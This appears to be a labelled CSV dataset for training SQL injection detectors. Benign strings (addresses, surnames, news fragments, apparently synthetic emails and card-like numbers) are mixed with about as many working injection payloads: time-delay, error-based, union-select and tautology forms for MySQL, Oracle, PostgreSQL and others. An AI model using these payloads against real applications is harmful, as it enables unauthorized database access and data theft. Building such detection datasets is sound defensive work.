Sentence,Label
"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and 'vmuj' like 'vmuj",1
"1"" and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ",1
1'  )  )   )  and sleep ( 5 )  and   (  (   ( 'lbmp' = 'lbmp,1
 The latter story particularly significant ,0
select case when 5308 = 6745 then 1 else null end--,1
"c/ meneses, 104 6-a",0
" And men, must accept highest mind transcendent destiny; minors invalids protected corner, cowards fleeing revolution, guides, redeemers, benefactors, obeying Almighty effort, advancing Chaos Dark",0
"1""  )  )   as zbfj where 2285 = 2285",1
1'  )  )   as xpmy where 5274 = 5274 rlike  ( select  ( case when  ( 6252 = 7704 )  then 1 else 0x28 end  )  )  --,1
0932689894259111,0
woodburn@vinavilano.hr,0
sant jordi/san jorge,0
panov@ballerpoker.sh,0
"1'|| ( select 'xsoq' from dual where 6690 = 6690 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  ||'",1
 The experimental results show method achieve higher performance CRF-based baseline method,0
 or isNULL ( 1/0 )  /*,1
pierfederici@softstylestudio.ls,0
" &quot; &quot; But move could make foreign investors reticent buy property London current owners reluctant sell , &quot; added ",0
wacker,0
hac228ej7,0
49653086l,0
beecher@mailboxrussia.gu,0
 Nothing last sacred integrity mind,0
poveda,0
calle arquitecto francisco bautista 4 1c,0
venzal tamayo,0
matar,0
gregescos,0
1'  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 'jzpb' = 'jzpb,1
" The rabbit show , however , open visitors 10: 00 a",0
"-1710""  )  )   as cvky where 1858 = 1858 union all select 1858,1858--",1
72094500b,0
"1'+ ( select 'uzaw' where 9900 = 9900 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  )  +'",1
diviu sauleda,0
4203,0
meleskie,0
bernaden,0
40979614p,0
" end and   (  (   ( ""poee"" = ""poee",1
turcot,0
5255016250924292,0
cgi down_file http://coolseo,0
" Two days later , half stock dealing USA came standstill several hours , due computer failure Nasdaq exchange ",0
"1 )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
chihung,0
" When user &quot; Anna &quot; sends email &quot; Benni &quot; , pair &apos;s computers directly connected ? Anna &apos;s email program browser first sends mail service provider &apos;s mail server ",0
"barranc de la torrentera, 56, 13?c",0
1  )  )   as ogcv where 4396 = 4396,1
" select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",1
"calle paz, s/n",0
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
 The Energy Department said Wednesday U,0
"1%' or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and '%' = '",1
"calle la pernia, 4",0
" &quot; The abbreviation stands &quot; Colonia Claudia Ara Agrippinensium &quot; , basically amounts &quot; City Roman Law City Agrippinians , founded Emperor Claudius Site Altars Imperial Cult &quot; ",0
padr pavajeau,0
8264568534946529,0
gorius,0
50373,0
"c/ gregal 56, 12?g",0
monforte de la sierra,0
ambrosi,0
4661,0
romualda,0
"1 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) # couj",1
-8828  )  )   as ospo where 2141 = 2141 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
"1'  )  )   and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (  'zknl' = 'zknl",1
; begin declare @var varchar ( 8000 )  set @var = ' ...,1
" In book , interior decorator presents 17 housing models independent living old age ",0
"1'  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'phdn' like 'phdn",1
"1%'  )  )   union all select null,null,null,null,null,null,null,null,null,null#",1
3192907631401763,0
"-1949 )  as smyn where 4066 = 4066 union all select 4066,4066--",1
ga+vanza,0
-9434' )  union all select 3106#,1
 ( select  ( case when  ( 6986 = 6986 )  then 6986 else 6986* ( select 6986 from mysql.db )  end  )  )  ,1
"carpio de tajo, el",0
8534,0
" select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",1
ramblizo,0
-9950' or 4425 = 1975,1
" What Le Pen newfound popularity among French white , working class ? She wants use next year &apos;s EU elections create anti-EU , anti-common currency bloc across European Parliament ",0
adapuesto,0
bryant,0
" select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'",1
sollman,0
96795973j,0
olmos de ojeda,0
"1"" )  where 5298 = 5298 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",1
urueas,0
shazmnn,0
2nd2y19i78b4e,0
 A stubborn ankle injury threatens prevent deployment Nicolai Müller FSV Mainz &apos;s Bundesliga away match FC Augsburg ,0
correch climent,0
"1""  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( ""wute"" like ""wute",1
 The lawyer returned home discover drugs nine communications ,0
eduardo,0
lovejoy,0
" select * from users where id = 1 or 1#"" (  union select null,version (  )  -- 1",1
efran,0
1' where 8482 = 8482 or sleep ( 5 ) #,1
"-7111 union all select 2409,2409,2409,2409,2409,2409#",1
corazoncill2,0
hanhua,0
obsequ.iosa,0
bryant@wave.com.mw,0
"plza. musico diaz cano 5,",0
perla,0
"-6368  )  )   union all select 4646,4646,4646,4646,4646,4646,4646--",1
"1""  )  )   or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
heilig,0
randall,0
05357,0
"1"" where 3678 = 3678 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1
sayers,0
"1'|| ( select 'alxi' where 3967 = 3967 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
infalibilidad,0
gimena,0
47815,0
"cartago 117, 12?b",0
"1""  )  )   and  ( 3020 = 3020 ) *6703 and   (  (  ""bely"" = ""bely",1
namkoong@quadernideilgarda.no,0
enconrea7,0
" select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'",1
riego,0
9209,0
1\'1,1
1  )  )   and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  6406 = 6406,1
-4785' or  ( 8459 = 8459 ) *4906 and 'esfn' = 'esfn,1
antoliano,0
6986967316168670,0
3795851836330194,0
grant connect to name; grant resource to name;,1
"1"" )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
trissenaar@tetdevelocidad.uk,0
"1"" )  as xrsi where 9498 = 9498",1
"1"" where 8571 = 8571",1
 Up managed individual training ,0
" This year , even absolute top athletes starting line main race ",0
1 )  as tykp where 6851 = 6851,1
"plaa del mercat, 198 7-c",0
"1  )  )   union all select null,null,null,null,null,null,null,null,null#",1
"antonio asenjo, 178, 6?h",0
blanc hormachea,0
"1'  )  )   )  and make_set ( 8403 = 8403,8899 )  and   (  (   ( 'zxon' like 'zxon",1
ondina viejo,0
"1"" )  where 3445 = 3445 and elt ( 1212 = 1254,1254 ) --",1
lacoste,0
muoz capato,0
"' union  ( select NULL,  ( select @@version  )  )   --",1
1  )  )   and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  9452 = 9452,1
caadillas almendro,0
1'  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (   ( 'acml' like 'acml,1
c39ine8ra,0
raysa,0
"-6389"" union all select 2355,2355,2355,2355,2355--",1
calle villalon 13 1g,0
"1  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
" Revolutionary Sacred Music Factory To close celebrations occasion 160th anniversary , Liederkranz Dunningen (Dunningen Amateur Choir , Glee Club , like) perform Franz Schubert &apos;s &quot; Deutsche Messe &quot; (German Mass) accompany two church services ",0
"c/ academia, 59, 3?g",0
9857,0
masini,0
maials,0
" Also involved project Chamber Industry Commerce Neubrandenburg German Hotel Restaurant Association (Deutsche Hotel- und Gaststätte , Dehoga) Mecklenburg-Western Pomerania ",0
x' AND members.email IS NULL; --,1
46643257q,0
aizpuru cerusoli,0
"4 per cent offered United Overseas Bank , local lender branch shopping centre ",0
"1' in boolean mode )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
select case when 2640 = 9249 then 1 else null end--,1
majagua,0
villanueva del campillo,0
"-3725'  )  )   union all select 1541,1541,1541,1541,1541#",1
almedina,0
maiga,0
almacelles,0
1 )  where 1090 = 1090 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
plaa caudillo 60,0
"1' )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'tvcm' = 'tvcm",1
c1ir4ia4e5a,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 'juhi' like 'juhi",1
4890165807728190,0
" The patents cover technology helps match Internet search terms relevant advertising , lawsuit said , core Google &apos;s search business ",0
adams@11horas.ng,0
" Frontier gone furthest area , though ",0
" But cost new vaccine likely far lower , turns liver cells antibody factories ",0
asaeteadora,0
21880,0
grigoriu matons,0
30599008s,0
01120,0
"1""  )  )   )  and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
soubier.roudenko@mtos.is,0
nakadai_newell@intercambioenlaces.tn,0
rescisorio,0
 The coffee afternoon held St,0
aldea del cano,0
"1%' )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( '%' = '",1
40151,0
"1'|| ( select 'xyrk' from dual where 9844 = 9844 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
redolad bordoll,0
malcocinado,0
"rec 64,",0
 They &apos;ve push vehicles rivers mud ,0
"calle son pujol des garroves, s/n,",0
"-8772%"" )  union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--",1
bryson2@casablancabeach.kp,0
" Familiar voice mind each, highest merit ascribe Moses, Plato, Milton is, set naught books traditions, spoke men thought",0
0000435499019462,0
23683952r,0
halbert,0
rodobaldo,0
"-8186%' or elt ( 1032 = 1032,3623 )  and '%' = '",1
"-2305' in boolean mode )  union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1
peabody,0
"1'  )  )   ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (  'oxvd' like 'oxvd",1
"1""  )  )   and 7656 = 5604 and   (  (  ""zuhv"" = ""zuhv",1
" The 70-minute performance glosses script host director &apos;s additions , well-known repertoire post-dramatic theatrical styles ",0
-3062'  )  )   or 6872 = 6872 and   (  (  'uzth' like 'uzth,1
1'+ ( select xwcl where 7997 = 7997,1
"1%""  )  )   )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (   ( ""%"" = """,1
"1"" where 4684 = 4684 union all select null,null,null,null#",1
1  )  )   as hxzh where 9284 = 9284,1
brutez,0
perafort,0
12370442f,0
remax ondetti,0
foguear,0
 The charges filed US justice department include espionage theft government property ,0
-9826 where 4103 = 4103 order by 1#,1
forniele calmet,0
tadeas4,0
tesisteco avi,0
"1"" )  where 3393 = 3393 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
zoel,0
" Options include upgraded brakes , service package providing access Bowler Works mechanics , logistic support , vehicle storage events ",0
aracena,0
"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'bpbe' like 'bpbe",1
select  ( case when  ( 5390 = 7419 )  then 5390 else 5390* ( select 5390 from mysql.db )  end ) #,1
30388165j,0
"1"" and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""jgcv"" = ""jgcv",1
geria,0
"-5278""  )  )   )  union all select 5264,5264,5264#",1
3893864101962581,0
"admin"" or ""1"" = ""1",1
ruben,0
 Germany &apos;s largest national church launched campaign advertising minister &apos;s position ,0
bianchi@atrioregalos.im,0
1'|| ( select 'iuud' where 3687 = 3687,1
ajorca,0
1' and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and 'zoin' = 'zoin,1
"1%"" )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
 The paper structured follows: Section 2 conducts survey related work,0
" select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1",1
4005,0
"1  )  )   )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
" government put , number school-age children suffering food allergies climbs ",0
" For flyers elbow room , suppliers increasingly issue could affect earnings ",0
escasamente,0
nadina,0
4330235428458719,0
lloyd-pack-partain@elalamorestaurante.ir,0
cossy@salaparis.tv,0
30584367w,0
17005940q,0
asacadora,0
1 )  where 4780 = 4780,1
44310,0
heal@quadernideilgarda.gob,0
3742884361976074,0
"1%""  )  )   )  union all select null,null#",1
60106679c,0
8alantos4,0
"calle juan de mena, 133",0
mamakos@palodegolf.com.rw,0
foa@mcrspain.lr,0
1' and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
36357,0
"linares, 42",0
5i852469,0
 The editor personally involved third ,0
"el halcon 154, 8?f",0
"-9197%""  )  )   )  union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#",1
9832,0
"1%' )  union all select null,null,null,null,null,null,null--",1
" Eye witnesses reported seeing shooter gun one departure lounges , reported several media ",0
09191,0
-4758%'  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  '%' = ',1
muniello llubet,0
hoseok,0
belanger,0
"calle estrella naos, 155",0
valls barri,0
" I hope somewhat better whim last, cannot spend day explanation",0
"1' )  as knxr where 5662 = 5662 union all select null,null,null,null,null,null,null,null#",1
91257210h,0
"c/ antonia lancha, 38, 1?h",0
c/ francisco rodriguez 48,0
wingard,0
"1'+ ( select 'zirh' where 9054 = 9054 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) +'",1
cseda,0
7915699195068000,0
select pg_sleep ( 5 )  and  ( 'aydg' = 'aydg,1
"-8205' or elt ( 6581 = 3480,3480 )  and 'sosv' = 'sosv",1
3o7za732,0
pis ramenghi,0
silvie,0
7709760846022131,0
villanueva de duero,0
"1"" )  as mibc where 3113 = 3113",1
1647,0
"1'  )  )   )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'msjw' like 'msjw",1
8l077ra,0
-1470'  )  )   )  or 9323 = 9323#,1
" select * from users where id = 1 or 1#""@ union select 1,version (  )  -- 1",1
-8015 )  where 9808 = 9808 or 9323 = 9323#,1
whitehur,0
neel@deseoun.aq,0
-8963 )  where 8528 = 8528 or  ( 2470 = 3271 ) *3271--,1
calle relleu 159,0
" , &quot; Oldies &quot; bring celebrations close ",0
" No classified information danger , spokesperson said ",0
subidor,0
"1%""  )  )   ) ",1
-4637' or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) ,1
1%' or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
"1' )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and  ( 'ekqv' = 'ekqv",1
 Both unfortunate parties taken nearby hospitals ,0
buch als,0
-6129 )  as vuze where 1565 = 1565 or  ( 8459 = 8459 ) *4906--,1
"1""  )  )   )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
" select * from users where id = '1' union select +\,@@VERSION -- 1'",1
"nuestra seora de las angustias s/n,",0
"c/ echegaray s/n,",0
30649909v,0
46842,0
" Whether person living house yet unclear , said police spokesperson Bayreuth ",0
tainsy@jaxiaabogadosyeconomistas.je,0
1' rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and 'xnap' = 'xnap,1
laticfero,0
" The country believed around 1,000 metric tons chemicals weapons including mustard gas nerve agent sarin ",0
44315,0
lazure,0
"-2085"" )  as hkev where 7730 = 7730 union all select 7730,7730--",1
ruiloba,0
rinconada valentin gonzalez 70,0
l5r78gea,0
05619,0
c/ orient 45,0
 The probe launched 2017 closely observe surface activity sun ,0
"calle bergueda 5, 5?d",0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )  --",1
calle ecuador 143,0
llinas rufi,0
6219323796056833,0
1' and non_existant_table  =  '1,1
20110,0
genee@dissident.sj,0
"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) ",1
"1""  )  )   as gbxx where 2459 = 2459 waitfor delay '0:0:5'--",1
"1"" )  as ikdo where 4128 = 4128",1
bizantina,0
0a04ale53,0
nentwich,0
"1"" or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and ""uqor"" like ""uqor",1
1%'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( '%' = ',1
"1' )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'xdce' = 'xdce",1
rees,0
2isnomo,0
select  ( case when  ( 3325 = 1767 )  then 3325 else 3325* ( select 3325 from mysql.db )  end ) #,1
gierasch.casini@goovitae.cu,0
1' )  as pogx where 4105 = 4105 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,1
mario,0
aileen,0
culminar,0
odelinda,0
"1%""  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( ""%"" = """,1
lula,0
-6298' or 4724 = 4876,1
chui_alberti@faders.com.nc,0
34491,0
 However said heartened worldwide response &quot; act political expression ,0
"las delicias 20,",0
lihul,0
"1' )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( 'thce' = 'thce",1
1'|| ( select 'ocmk' from dual where 3961 = 3961 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   ) ||',1
"duende, 138,",0
albina,0
culham,0
"1' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) --",1
kamekona@gopersonaltrainers.fj,0
1006455310670976,0
" In small town New Zealand , Burt Munro considered lovable oddball , resolved compete race America 1920 motorbike ",0
vanity@espaciodelpintor.kn,0
24530,0
husky_hurlic@ropadegolf.sn,0
radioelctrica,0
yeo-hoon,0
"1""  )  )   )  union all select null,null,null,null,null,null,null--",1
chancer@gestionsoftware.mq,0
"c/ galicia, 180,",0
curtis,0
chao-pin2,0
18vi5i9ad,0
20530,0
pons anguita,0
bosier@opel-e-flex.bn,0
calle rascon 144,0
7656,0
atef,0
0669143201019058,0
"1 )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
moldero,0
